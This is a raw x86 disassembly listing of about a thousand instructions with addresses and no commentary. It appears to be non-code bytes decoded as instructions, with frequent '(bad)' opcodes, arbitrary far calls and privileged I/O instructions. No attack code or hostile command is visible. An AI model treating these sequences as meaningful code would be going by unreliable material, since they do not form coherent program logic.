  438148:	test   BYTE PTR [eax+0x312cffbc],bh
  43814e:	push   0x9778b2c9
  438153:	cmp    al,0x48
  438155:	jmp    0x774a1444
  43815a:	xchg   esi,eax
  43815b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43815c:	add    eax,0xc69755cb
  438161:	pop    edi
  438162:	ret    0xb2df
  438165:	mov    ds:0x272f3311,al
  43816a:	pop    ss
  43816b:	mov    eax,ebp
  43816d:	or     edx,DWORD PTR [ecx+0xfa01df0]
  438173:	jnp    0x43811b
  438175:	cdq    
  438176:	jecxz  0x4381db
  438178:	mov    dl,0x6
  43817a:	cdq    
  43817b:	hlt    
  43817c:	retf   0x4528
  43817f:	dec    edx
  438180:	xor    eax,0xe8a98d0e
  438185:	outs   dx,DWORD PTR ds:[esi]
  438186:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438187:	dec    esp
  438188:	jb     0x4381f8
  43818a:	pop    es
  43818b:	out    dx,eax
  43818c:	cmp    eax,0xebc2a20b
  438191:	ror    BYTE PTR [edi-0x6407030e],cl
  438197:	(bad)  
  438199:	lea    esp,[ecx+0x5395726c]
  43819f:	jp     0x438203
  4381a1:	(bad)  
  4381a2:	scas   eax,DWORD PTR es:[edi]
  4381a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4381a4:	push   eax
  4381a5:	pop    esp
  4381a6:	je     0x4381ee
  4381a8:	add    DWORD PTR [edx+0xab2b905],esp
  4381ae:	pop    esi
  4381af:	xchg   ebx,eax
  4381b0:	aad    0xe7
  4381b2:	shr    DWORD PTR [edx+esi*2],1
  4381b5:	or     edx,DWORD PTR ds:0x4e33c255
  4381bb:	pop    ebp
  4381bc:	fsub   st,st(4)
  4381be:	popf   
  4381bf:	fistp  QWORD PTR [ebx]
  4381c1:	and    eax,DWORD PTR [esi-0x67]
  4381c4:	xchg   edx,eax
  4381c5:	es push edx
  4381c7:	and    edi,esp
  4381c9:	or     ebx,DWORD PTR [ecx-0x6f]
  4381cc:	jns    0x4381ea
  4381ce:	pop    esp
  4381cf:	je     0x4381dd
  4381d1:	jge    0x43816d
  4381d3:	dec    ecx
  4381d5:	push   edi
  4381d6:	inc    esp
  4381d7:	mov    esi,0xa68e7b0d
  4381dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4381dd:	call   0x57bf:0x1967691a
  4381e4:	jle    0x438255
  4381e6:	out    0xf3,al
  4381e8:	mov    bl,0xf5
  4381ea:	fist   DWORD PTR [esi]
  4381ec:	push   ebx
  4381ed:	ret    
  4381ee:	inc    eax
  4381ef:	mov    ds:0xa7c93782,al
  4381f4:	jbe    0x4381b1
  4381f6:	std    
  4381f7:	lds    ecx,FWORD PTR [edx]
  4381f9:	inc    ecx
  4381fa:	xor    DWORD PTR [ecx-0x4e],0xffffffab
  4381fe:	mov    WORD PTR ds:0x939d2f1b,es
  438204:	jb     0x438211
  438206:	fdivr  st(5),st
  438208:	jo     0x438280
  43820a:	cld    
  43820b:	cli    
  43820c:	adc    eax,0xea4f9a0a
  438211:	aad    0xbf
  438213:	mov    dl,0xb
  438215:	inc    BYTE PTR [ebx+0x270c245b]
  43821b:	sbb    BYTE PTR [ecx],dl
  43821d:	out    dx,eax
  43821e:	add    al,0x67
  438220:	nop
  438221:	jns    0x43828c
  438223:	jp     0x4381d7
  438225:	cmp    BYTE PTR [eax+edi*1-0x3d375109],bh
  43822c:	in     al,dx
  43822d:	or     edi,ecx
  43822f:	pop    esp
  438230:	sti    
  438231:	into   
  438232:	push   esp
  438233:	pop    edx
  438234:	cmp    DWORD PTR [edx+ebx*4-0x3f9af56b],esp
  43823b:	ins    DWORD PTR es:[edi],dx
  43823c:	xchg   ebp,eax
  43823d:	(bad)  
  43823e:	adc    esp,DWORD PTR [edi-0x66385892]
  438244:	mov    ah,0xd9
  438246:	sbb    DWORD PTR es:[edx-0xe2ce437],esi
  43824d:	jo     0x43823c
  43824f:	lock fmul QWORD PTR [edx]
  438252:	stos   BYTE PTR es:[edi],al
  438253:	cmp    al,BYTE PTR [esi-0x10]
  438256:	inc    esi
  438257:	xor    DWORD PTR [edx],edx
  438259:	iret   
  43825a:	aam    0xd4
  43825c:	mov    dl,0xa4
  43825e:	or     ebp,DWORD PTR [ebp+eax*4-0x24]
  438262:	cmp    eax,0xc4573f57
  438267:	fnsave [edx+0x67e125b8]
  43826d:	xchg   edi,eax
  43826e:	xchg   esi,eax
  43826f:	lods   al,BYTE PTR ds:[esi]
  438270:	mov    DWORD PTR [ebx+0x6bff2490],ebp
  438276:	xchg   edx,eax
  438277:	daa    
  438278:	and    dh,al
  43827a:	leave  
  43827b:	aas    
  43827c:	xchg   dh,bh
  43827e:	push   es
  43827f:	stos   DWORD PTR es:[edi],eax
  438280:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  438282:	jl     0x4382f8
  438284:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438285:	cwd    
  438287:	and    edi,DWORD PTR [ebx+eiz*2-0x11]
  43828b:	stos   BYTE PTR es:[edi],al
  43828c:	jnp    0x438288
  43828e:	and    BYTE PTR [ecx-0x1595473],ch
  438294:	loop   0x438270
  438296:	dec    ebx
  438297:	repnz mov BYTE PTR [edx+eax*2-0x77de4d28],bh
  43829f:	int    0x67
  4382a1:	mov    es,WORD PTR [eax-0x3b]
  4382a4:	mov    eax,0xb1d0f70c
  4382a9:	lods   al,BYTE PTR ds:[esi]
  4382aa:	or     al,bh
  4382ac:	mov    bl,0xb2
  4382ae:	sub    al,0x87
  4382b0:	mov    dl,0x93
  4382b2:	cmp    DWORD PTR [ebp+0x6e5db5db],edi
  4382b8:	shr    ch,cl
  4382ba:	and    DWORD PTR [edi+0xe918fc0],0xffffffa5
  4382c1:	jge    0x438273
  4382c3:	sbb    dh,BYTE PTR [ecx+0x17493161]
  4382c9:	or     al,BYTE PTR ds:0xc5656240
  4382cf:	fcomp  DWORD PTR [edx+0x6cce980b]
  4382d5:	mov    ebp,DWORD PTR [ecx]
  4382d7:	std    
  4382d8:	mov    edx,0x79619ae6
  4382dd:	and    BYTE PTR [eax+ebx*2-0x5834ac45],dh
  4382e4:	pop    esi
  4382e5:	dec    edx
  4382e6:	mov    ebp,0x1e644f8a
  4382eb:	addr16 (bad) 
  4382ed:	repnz aaa 
  4382ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4382f0:	pop    edi
  4382f1:	push   0x6d44c3c8
  4382f6:	fwait
  4382f7:	mov    edx,0xa7a2fefa
  4382fc:	inc    ebx
  4382fd:	inc    eax
  4382fe:	inc    edx
  4382ff:	dec    ecx
  438300:	fisub  WORD PTR [edi+0x5320ac9a]
  438306:	push   ebx
  438307:	sbb    DWORD PTR [ebp-0x7256c077],ebx
  43830d:	fimul  WORD PTR ds:[ebx-0x33]
  438311:	retf   
  438312:	mov    edi,0xb09f7c03
  438317:	dec    edi
  438318:	mov    dl,0x9b
  43831a:	jmp    0x438377
  43831c:	bound  ecx,QWORD PTR [edi-0x34bd48a8]
  438322:	jp     0x4382fe
  438324:	dec    ebp
  438325:	shl    DWORD PTR [ecx+0x49fb5bfe],1
  43832b:	and    eax,0xdca5cf5c
  438330:	stc    
  438331:	or     ebp,DWORD PTR [ebp-0x1d]
  438334:	inc    esi
  438335:	adc    al,0xf1
  438337:	pushf  
  438338:	xchg   ecx,eax
  438339:	pop    ss
  43833a:	data16 icebp 
  43833c:	daa    
  43833d:	dec    ebx
  43833e:	xchg   ebx,eax
  43833f:	int    0x9b
  438341:	ret    0x537
  438344:	mov    dl,0xe1
  438346:	mov    edx,eax
  438348:	mov    edx,0xb51191c6
  43834d:	or     edi,edi
  43834f:	mov    bl,BYTE PTR [ebx]
  438351:	cwde   
  438352:	and    dl,BYTE PTR [edx+ebp*2-0x12]
  438356:	call   0xd547:0x371ab381
  43835d:	mov    ebx,0xbcedab9
  438362:	pop    esi
  438363:	out    0xbe,al
  438365:	pushf  
  438366:	inc    edx
  438367:	and    eax,DWORD PTR [ecx-0x42911090]
  43836d:	or     bl,BYTE PTR [edx]
  43836f:	pop    eax
  438370:	push   edi
  438371:	imul   edi,DWORD PTR [eax-0x6f811238],0xffffffa7
  438378:	pop    esp
  438379:	out    dx,eax
  43837a:	xor    ecx,ebp
  43837c:	add    al,0x1d
  43837e:	push   esi
  438380:	scas   al,BYTE PTR es:[edi]
  438381:	test   BYTE PTR [edi],dl
  438383:	and    al,0x32
  438385:	adc    DWORD PTR [eax+0x6e5b7ac5],edi
  43838b:	jmp    DWORD PTR [edx+0x0]
  43838e:	call   0xbe1c:0xce23f156
  438395:	neg    DWORD PTR [edx+0x37ccba78]
  43839b:	or     BYTE PTR [ebp-0x54],dl
  43839e:	mov    bl,0xa7
  4383a0:	pushf  
  4383a1:	mov    eax,ds:0x8360d757
  4383a6:	jo     0x438371
  4383a8:	mov    dl,0xfd
  4383aa:	mov    DWORD PTR [ecx],ebp
  4383ac:	(bad)  
  4383ad:	mov    dh,0x56
  4383af:	jge    0x438376
  4383b1:	ja     0x438396
  4383b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4383b4:	mov    BYTE PTR [ebx],0x3c
  4383b7:	aas    
  4383b8:	enter  0xd2e1,0xf3
  4383bc:	mov    dl,0xc2
  4383be:	inc    ebx
  4383bf:	jg     0x4383b3
  4383c1:	out    dx,al
  4383c2:	pop    ebx
  4383c3:	push   es
  4383c4:	sahf   
  4383c5:	mov    bl,0xc1
  4383c7:	mov    al,ds:0x21598efc
  4383cc:	js     0x4383da
  4383ce:	dec    esi
  4383cf:	pop    es
  4383d0:	jle    0x4383bf
  4383d2:	out    dx,eax
  4383d3:	test   BYTE PTR [edx],dl
  4383d5:	(bad)
  4383da:	sub    eax,0xc6353672
  4383df:	retf   
  4383e0:	imul   esp,DWORD PTR [eax],0xffffffda
  4383e3:	adc    eax,0xa491349b
  4383e8:	dec    eax
  4383e9:	xchg   esp,eax
  4383ea:	jp     0x4383d3
  4383ec:	push   eax
  4383ed:	mov    dh,0x12
  4383ef:	outs   dx,DWORD PTR ds:[esi]
  4383f0:	(bad)  
  4383f1:	xchg   ebx,eax
  4383f2:	xchg   ebp,eax
  4383f3:	mov    WORD PTR [edx],es
  4383f5:	cmp    eax,0x988d2782
  4383fa:	repz jmp 0xecc1:0x81e00b23
  438402:	add    ebp,DWORD PTR [esi]
  438404:	xchg   ebx,eax
  438405:	fstp   DWORD PTR [edx+0x2167e5eb]
  43840b:	in     eax,0x47
  43840d:	int    0x68
  43840f:	inc    ebp
  438410:	sbb    eax,0x3c2bbe0b
  438415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438416:	std    
  438417:	pop    ebx
  438418:	call   0x5e59:0xccb79aae
  43841f:	mov    ds:0xa7e8a83a,al
  438424:	into   
  438425:	sbb    BYTE PTR [ebx-0x3a4cf820],0xce
  43842c:	mov    dl,0x30
  43842e:	mov    WORD PTR [eax],?
  438430:	sub    eax,0xc91d88e2
  438435:	or     dh,ch
  438437:	nop
  438438:	add    BYTE PTR [eax-0x208a0dc9],bh
  43843e:	mov    esp,0x7034b2cc
  438443:	cmp    al,0x3b
  438445:	and    eax,0x803ff87
  43844a:	lock sbb al,0x91
  43844d:	push   ds
  43844e:	or     al,0xf8
  438450:	adc    dl,BYTE PTR [edx+0xcb26c18]
  438456:	jno    0x4384d7
  438458:	jg     0x438426
  43845a:	xor    eax,0x4a14f463
  43845f:	sahf   
  438460:	pusha  
  438461:	mov    eax,DWORD PTR [esi]
  438463:	mov    ch,0x15
  438465:	mov    ebp,0x74ad6bce
  43846a:	loop   0x43842f
  43846c:	popa   
  43846d:	lea    ebx,[edx-0x4b5a0551]
  438473:	pop    ebp
  438474:	ror    BYTE PTR [ecx+edx*8],cl
  438477:	stos   BYTE PTR es:[edi],al
  438478:	lea    esp,[ecx]
  43847a:	stos   DWORD PTR es:[edi],eax
  43847b:	mov    bh,0xca
  43847d:	(bad)  
  43847e:	adc    eax,0x4bc9b247
  438483:	xor    BYTE PTR [ebp-0x57],ch
  438486:	leave  
  438487:	(bad)  
  438488:	jmp    0x438495
  43848a:	outs   dx,BYTE PTR ds:[esi]
  43848b:	int3   
  43848c:	jb     0x4384ed
  43848e:	ja     0x438442
  438490:	add    ecx,DWORD PTR [ecx-0x66]
  438493:	and    eax,0x75b37088
  438498:	ds dec esi
  43849a:	mov    ebx,0xdee83fa7
  43849f:	inc    ecx
  4384a0:	mov    eax,ds:0x8cbe77b2
  4384a5:	test   DWORD PTR [edi],ebx
  4384a7:	daa    
  4384a8:	mov    eax,0xa8aa1efd
  4384ad:	daa    
  4384ae:	je     0x43848b
  4384b0:	stos   BYTE PTR es:[edi],al
  4384b1:	or     ecx,DWORD PTR [ebx-0x66]
  4384b4:	jno    0x43843e
  4384b6:	jae    0x43843f
  4384b8:	je     0x438502
  4384ba:	fwait
  4384bb:	pop    edi
  4384bc:	test   cl,dh
  4384be:	fdivr  QWORD PTR [ecx]
  4384c0:	in     al,0x64
  4384c2:	mov    ebx,0x72f847ab
  4384c7:	popf   
  4384c8:	inc    esi
  4384c9:	or     dh,BYTE PTR [esi+0x284aa4f3]
  4384cf:	jge    0x4384b0
  4384d1:	jmp    0xb59a:0x457e4fa7
  4384d8:	jl     0x4384ac
  4384da:	adc    al,0xf4
  4384dc:	mov    ch,0xab
  4384de:	adc    eax,0x1c629aa7
  4384e3:	push   0x78
  4384e5:	xor    edx,eax
  4384e7:	mov    cl,0x9c
  4384e9:	cs dec bx
  4384ec:	mov    dl,0x9f
  4384ee:	ja     0x43850c
  4384f0:	add    DWORD PTR [edx],edx
  4384f2:	jp     0x43849b
  4384f4:	mov    ebp,0x14752b77
  4384f9:	jmp    0xdaf5e4e5
  4384fe:	(bad)  
  438500:	mov    dh,0x45
  438502:	(bad)  
  438503:	fstp   st(0)
  438505:	jns    0x4384d9
  438507:	dec    ebp
  438508:	cs add al,0xcd
  43850b:	bound  edi,QWORD PTR [eax]
  43850d:	scas   eax,DWORD PTR es:[edi]
  43850e:	call   0xb14d:0x2a2bdbb5
  438515:	cmp    BYTE PTR [eax],ah
  438517:	cmp    dl,bh
  438519:	sbb    BYTE PTR [eax],bl
  43851b:	aas    
  43851c:	sbb    al,0xd8
  43851e:	js     0x438560
  438520:	cmp    BYTE PTR [eax+edi*4-0x59],0xbb
  438525:	shr    BYTE PTR [eax-0xf],cl
  438528:	fsubrp st(5),st
  43852a:	outs   dx,BYTE PTR ds:[esi]
  43852b:	or     al,0xb0
  43852d:	mov    ds:0x4ecc2114,eax
  438532:	push   eax
  438533:	jo     0x438587
  438535:	sbb    esi,edx
  438537:	mov    esi,0x2838b7b1
  43853c:	arpl   WORD PTR [edx+0x53],si
  43853f:	das    
  438540:	or     dl,BYTE PTR [esi]
  438542:	in     eax,dx
  438543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438544:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  438547:	popa   
  438548:	inc    ebp
  438549:	push   esi
  43854a:	adc    DWORD PTR [ebp-0x6c],eax
  43854d:	aas    
  43854e:	test   ecx,edx
  438550:	mov    dl,0x97
  438552:	in     eax,0x19
  438554:	sbb    esp,DWORD PTR [edi+0x635ba73f]
  43855a:	sub    esp,DWORD PTR [ecx]
  43855c:	and    al,0x0
  43855e:	add    al,0x1d
  438560:	(bad)  
  438561:	pusha  
  438562:	call   0xf73b:0x398a2899
  438569:	cmp    DWORD PTR [edi-0x7d33a959],eax
  43856f:	setg   BYTE PTR [eax]
  438572:	push   ecx
  438573:	cmp    dh,BYTE PTR [edx+0x16f8e1b0]
  438579:	xor    al,0x47
  43857b:	jae    0x438502
  43857d:	movmskps ebp,xmm6
  438580:	loop   0x438504
  438582:	inc    esp
  438583:	daa    
  438584:	xor    edi,DWORD PTR [edx-0x41502d30]
  43858a:	int    0x60
  43858c:	jno    0x438582
  43858e:	xor    al,0xf
  438590:	ins    DWORD PTR es:[edi],dx
  438591:	retf   
  438592:	dec    ecx
  438593:	(bad)  
  438594:	icebp  
  438595:	pop    ss
  438596:	or     bh,BYTE PTR [eax+0x68bb8bb6]
  43859c:	mov    cl,0xf0
  43859e:	and    eax,0xe9ccbb3b
  4385a3:	push   edx
  4385a4:	fisttp QWORD PTR [eax-0x445c4d11]
  4385aa:	push   ds
  4385ab:	xlat   BYTE PTR ds:[ebx]
  4385ac:	leave  
  4385ad:	xor    al,0x47
  4385af:	add    eax,0x46c72832
  4385b4:	idiv   DWORD PTR [edx+0x5356645e]
  4385ba:	call   0xa351:0x22d739bf
  4385c1:	and    DWORD PTR [ebx-0x2fd25659],ebx
  4385c7:	imul   ebx,DWORD PTR [esi],0xb37a1cd0
  4385cd:	rol    BYTE PTR [ebp-0x479b08ef],cl
  4385d3:	add    al,0x46
  4385d5:	mov    edi,0xafe2a773
  4385da:	std    
  4385db:	push   0xffffff9a
  4385dd:	jns    0x438625
  4385df:	jo     0x438594
  4385e1:	inc    edx
  4385e2:	and    DWORD PTR [ecx-0x10],0x5ad80a51
  4385e9:	xor    al,0xa3
  4385eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4385ec:	cmp    ebx,DWORD PTR [edi]
  4385ee:	pop    ebx
  4385ef:	ins    DWORD PTR es:[edi],dx
  4385f0:	cmp    eax,0x83897b71
  4385f5:	xlat   BYTE PTR ds:[ebx]
  4385f6:	dec    esp
  4385f7:	scas   eax,DWORD PTR es:[edi]
  4385f8:	mov    esp,0x8ca3c109
  4385fd:	dec    ebx
  4385fe:	adc    DWORD PTR [esi+eiz*1-0x2c58e0c1],ebp
  438605:	fs int 0x43
  438608:	sub    dh,BYTE PTR [esi]
  43860a:	jbe    0x43863d
  43860c:	pushf  
  43860d:	test   DWORD PTR [esi+0x38fcb68f],edi
  438613:	outs   dx,BYTE PTR ds:[esi]
  438614:	xor    DWORD PTR [ebx-0x4f],ebp
  438617:	pop    edi
  438618:	add    al,dh
  43861a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43861b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43861c:	sub    bh,cl
  43861e:	xchg   ebp,eax
  43861f:	loope  0x4385a4
  438621:	xchg   BYTE PTR [ecx],dh
  438623:	pop    eax
  438624:	mov    ch,0xea
  438626:	jp     0x438675
  438628:	xchg   ecx,eax
  438629:	mov    ch,dl
  43862b:	pop    esi
  43862c:	sbb    eax,0x54a76a12
  438631:	jp     0x43866d
  438633:	xchg   edi,eax
  438634:	cmp    al,cl
  438636:	jge    0x4385f5
  438638:	mov    esp,0xaf33d72f
  43863d:	retf   
  43863e:	ins    DWORD PTR es:[edi],dx
  43863f:	mov    dh,0x7a
  438641:	iret   
  438642:	or     edi,DWORD PTR [ecx+0x787b385e]
  438648:	push   ss
  438649:	or     eax,DWORD PTR [ebx-0x74]
  43864c:	test   BYTE PTR [esi],al
  43864e:	add    BYTE PTR [edx+esi*4],bl
  438651:	nop
  438652:	jecxz  0x4385f0
  438654:	sar    DWORD PTR [eax-0x6a],1
  438657:	push   cs
  438658:	xchg   BYTE PTR [ebx],cl
  43865a:	gs gs push 0x1f48dec7
  438661:	into   
  438662:	call   0xf203:0x24dc3467
  438669:	stos   BYTE PTR es:[edi],al
  43866a:	dec    eax
  43866b:	test   al,0xb7
  43866d:	pop    ecx
  43866e:	adc    dh,bh
  438670:	mov    cs,WORD PTR [ebx-0x40f6ad13]
  438676:	out    dx,eax
  438677:	sub    DWORD PTR [edx+0x7ecaf0ab],esi
  43867d:	mov    ebx,DWORD PTR [edi-0xef42e89]
  438683:	shr    DWORD PTR [eax-0x2b],0xa7
  438687:	push   esi
  438688:	div    DWORD PTR [esp+ebp*8+0x1d]
  43868c:	mov    dl,0x83
  43868e:	outs   dx,DWORD PTR ds:[esi]
  43868f:	adc    edx,DWORD PTR [esi+0xda0a21a]
  438695:	add    al,0x51
  438697:	sub    ah,ah
  438699:	push   edi
  43869a:	call   0xb2b7:0x611c7889
  4386a1:	add    al,0x9c
  4386a3:	or     eax,0x942d2341
  4386a8:	jo     0x4386b5
  4386aa:	sbb    DWORD PTR [ebp+0x1ddc323b],ebp
  4386b0:	ror    edx,0x9a
  4386b3:	fiadd  DWORD PTR [edi-0x6ae433ef]
  4386b9:	mov    esp,DWORD PTR [ecx-0xe403c59]
  4386bf:	push   cs
  4386c0:	add    eax,0xb2bb134e
  4386c5:	(bad)  
  4386c6:	mov    eax,0xd81e3149
  4386cb:	sub    esp,DWORD PTR [ebx]
  4386cd:	or     edi,DWORD PTR [ecx+0x0]
  4386d0:	ror    cl,1
  4386d2:	std    
  4386d3:	mov    ebp,0x829a6a10
  4386d8:	sub    ecx,0x21
  4386db:	mov    DWORD PTR [ebx-0x6d],ebp
  4386de:	inc    ecx
  4386df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4386e0:	and    eax,0xd0780c35
  4386e5:	xor    edi,DWORD PTR [ebp-0xe]
  4386e8:	add    dh,BYTE PTR [ebx-0x66]
  4386eb:	or     ebp,DWORD PTR [esi+eax*1+0x19dac69e]
  4386f2:	dec    ecx
  4386f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4386f4:	iret   
  4386f5:	fidiv  WORD PTR [edx-0x67]
  4386f8:	test   al,0x23
  4386fa:	xchg   ebp,eax
  4386fb:	pop    ebp
  4386fc:	scas   eax,DWORD PTR es:[edi]
  4386fd:	add    bh,BYTE PTR [esi+esi*2]
  438700:	dec    esi
  438701:	mov    esi,DWORD PTR [ecx+0x1af3ceb6]
  438707:	sub    edi,edx
  438709:	add    eax,0xa00c8e91
  43870e:	call   0xb3d0:0xb880169d
  438715:	ins    DWORD PTR es:[edi],dx
  438716:	scas   eax,DWORD PTR es:[edi]
  438717:	pop    eax
  438718:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438719:	ja     0x438793
  43871b:	aaa    
  43871c:	popa   
  43871d:	mov    WORD PTR [edx],ds
  43871f:	int    0xca
  438721:	in     al,0x3b
  438723:	fcomp  st(2)
  438725:	call   DWORD PTR [ebp+0x3d048549]
  43872b:	mov    al,0xad
  43872d:	xor    BYTE PTR [ebx+0x47a0c976],bl
  438733:	fcom   QWORD PTR [edx]
  438735:	cmp    eax,0x2fc3a73e
  43873a:	cmovb  esp,DWORD PTR [ecx-0x43b4a3df]
  438741:	and    BYTE PTR [ebp+0x216b500b],cl
  438747:	mov    al,ds:0xa7884e68
  43874c:	pop    ds
  43874d:	lods   eax,DWORD PTR ds:[esi]
  43874e:	jmp    0xd496706a
  438753:	cmp    al,0xb2
  438755:	xor    BYTE PTR gs:[ebx],al
  438758:	(bad)
  43875b:	add    BYTE PTR ds:0xdd99180b,bl
  438761:	xchg   ebp,eax
  438762:	aas    
  438763:	stos   DWORD PTR es:[edi],eax
  438764:	test   DWORD PTR [edi-0x66],ebp
  438767:	lock loop 0x43877c
  43876a:	in     eax,dx
  43876b:	scas   al,BYTE PTR es:[edi]
  43876c:	dec    ecx
  43876d:	xchg   ebx,eax
  43876e:	sub    DWORD PTR [edi+0x15],edx
  438771:	or     al,0x5d
  438773:	lods   eax,DWORD PTR ds:[esi]
  438774:	(bad)  
  438775:	pushw  ss
  438777:	xchg   DWORD PTR [edx],ecx
  438779:	jae    0x4387bd
  43877b:	xlat   BYTE PTR ds:[ebx]
  43877c:	mov    dl,0x3
  43877e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43877f:	imul   esi,DWORD PTR [esi],0x4a
  438782:	push   0x3c
  438784:	sub    al,0xb
  438786:	sub    dh,BYTE PTR [ecx]
  438788:	ret    
  438789:	jmp    0x5572:0x71797869
  438790:	mov    dl,0x99
  438792:	mov    ecx,0x5c04153f
  438797:	sbb    edx,0xb3c83437
  43879d:	call   0xadb51ed2
  4387a2:	loope  0x438817
  4387a4:	pop    eax
  4387a5:	mov    dl,0x9d
  4387a7:	inc    ebx
  4387a8:	dec    edx
  4387a9:	xchg   ah,ch
  4387ab:	cmp    dl,ah
  4387ad:	loopne 0x4387b9
  4387af:	enter  0x7872,0x9
  4387b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4387b4:	test   eax,0x4b2be392
  4387b9:	ds inc edx
  4387bb:	inc    ebp
  4387bc:	mov    bh,0x41
  4387be:	cwde   
  4387bf:	adc    DWORD PTR [ebx],ebx
  4387c1:	mov    eax,esi
  4387c3:	rcr    BYTE PTR [esi],1
  4387c5:	jmp    0xc63fef91
  4387ca:	shl    DWORD PTR [edi-0x53ffa0df],cl
  4387d0:	jmp    0xc88c:0xb2daf7f1
  4387d7:	pop    esi
  4387d8:	mov    bl,0x20
  4387da:	jg     0x4387fa
  4387dc:	jno    0x438813
  4387de:	int3   
  4387df:	mov    esi,DWORD PTR [edx]
  4387e1:	adc    eax,0x6664e354
  4387e6:	add    bh,al
  4387e8:	xchg   esp,eax
  4387e9:	fwait
  4387ea:	clc    
  4387eb:	jns    0x4387aa
  4387ed:	mov    bl,0xd7
  4387ef:	xchg   DWORD PTR [edi],esi
  4387f1:	ds sbb al,0x72
  4387f4:	jns    0x438801
  4387f6:	mov    WORD PTR [esi+0x63ba67f2],ss
  4387fc:	ret    
  4387fd:	inc    edx
  4387fe:	xchg   esp,eax
  4387ff:	jbe    0x4387e6
  438801:	pop    es
  438802:	jp     0x4387cb
  438804:	mov    eax,0x160f84dc
  438809:	ss pop ebx
  43880b:	mov    BYTE PTR [edx],dh
  43880d:	jge    0x438842
  43880f:	add    al,0xe
  438811:	mov    ebp,DWORD PTR [edi+0x68]
  438814:	mov    dl,0x55
  438816:	rol    DWORD PTR [edi],0x9e
  438819:	add    eax,DWORD PTR [edi+0x61ab78fa]
  43881f:	fcomp  DWORD PTR [ebx]
  438821:	or     BYTE PTR [ebx+0x2],dl
  438824:	gs loopne 0x4387b2
  438827:	mov    ds:0xbb637f22,eax
  43882c:	mov    dl,0x14
  43882e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43882f:	mov    eax,ds:0xf8c66e91
  438834:	xor    eax,0xc33c690b
  438839:	sub    dh,BYTE PTR [edi-0x2d]
  43883c:	shr    DWORD PTR [eax-0x2910e563],0xbf
  438843:	mov    ebx,0xfdea8292
  438848:	and    BYTE PTR [ebx],cl
  43884a:	imul   eax,DWORD PTR [ebx+0xe],0x509eccc6
  438851:	icebp  
  438852:	call   0xe04b:0x1406a7b5
  438859:	cli    
  43885a:	(bad)  
  43885b:	fwait
  43885c:	es add al,0x5
  43885f:	mov    BYTE PTR [edi-0x78],cl
  438862:	fiadd  DWORD PTR [ecx-0x11]
  438865:	mov    ch,0x2a
  438867:	(bad)  
  438868:	mov    edx,0x75559ae2
  43886d:	or     al,0xf8
  43886f:	sbb    al,0xe3
  438871:	xchg   ebp,eax
  438872:	dec    eax
  438873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  438874:	jmp    0x343e:0xf09e8d54
  43887b:	bound  esi,QWORD PTR [edx-0x23a3d317]
  438881:	sbb    ecx,ebx
  438883:	cmp    ebp,DWORD PTR [ebp+0x1120420b]
  438889:	lods   eax,DWORD PTR ds:[esi]
  43888a:	and    al,0xc7
  43888c:	shr    ch,1
  43888e:	call   0xdb02:0x83ddf048
  438895:	arpl   WORD PTR [eax+ebx*8],dx
  438898:	sub    al,0xb
  43889a:	adc    BYTE PTR [edi-0x3dfc4cba],bl
  4388a0:	jns    0x438870
  4388a2:	call   0xa4c8:0xd3302a93
  4388a9:	inc    ebx
  4388aa:	cmp    eax,0xeba53db8
  4388af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4388b0:	dec    ebp
  4388b1:	les    ebp,FWORD PTR [eax-0x57]
  4388b4:	jmp    0x4388a0
  4388b6:	call   0xb821:0xd9f76081
  4388bd:	nop
  4388be:	sbb    edx,ebp
  4388c0:	ins    DWORD PTR es:[edi],dx
  4388c1:	or     edx,DWORD PTR [ecx+0x6d944ca6]
  4388c7:	loope  0x4388cb
  4388c9:	bound  ebx,QWORD PTR [edx-0x8f79a93]
  4388cf:	dec    esp
  4388d0:	jge    0x4388ca
  4388d2:	mov    esi,0x461e05ba
  4388d7:	in     eax,0xc9
  4388d9:	rcl    BYTE PTR [esi-0x29],1
  4388dc:	jb     0x43894a
  4388de:	dec    ebx
  4388df:	and    cl,BYTE PTR [ebx-0x11]
  4388e2:	cmp    eax,0x9a4b253
  4388e7:	dec    edx
  4388e8:	xchg   ebp,eax
  4388e9:	adc    eax,0xb84ebc8
  4388ee:	xor    dl,cl
  4388f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4388f1:	aaa    
  4388f2:	jae    0x43890a
  4388f4:	test   DWORD PTR [ebx+0xa],edx
  4388f7:	mov    bl,0x5c
  4388f9:	lods   eax,DWORD PTR ds:[esi]
  4388fa:	call   0x5050:0xe8b101e7
  438901:	xchg   edx,eax
  438902:	mov    ecx,0xa4e416a7
  438907:	leave  
  438908:	mov    ecx,0xc42bea44
  43890d:	jle    0x4388a9
  43890f:	mov    dh,0x6c
  438911:	popa   
  438912:	mov    al,ds:0xb3f44a8b
  438917:	mov    al,ds:0x220b8826
  43891c:	test   DWORD PTR [eax-0x1d],ebp
  43891f:	fwait
  438920:	add    ch,BYTE PTR ds:0x8fb2aa90
  438926:	or     eax,edx
  438928:	rcr    BYTE PTR [ecx],cl
  43892a:	dec    esp
  43892b:	or     eax,0x9979046d
  438930:	call   0x6dd5:0x3246b51c
  438937:	xchg   DWORD PTR [esi],edx
  438939:	leave  
  43893a:	call   0x5921:0x822de28
  438941:	sub    bl,BYTE PTR [esi+0x4b5748a7]
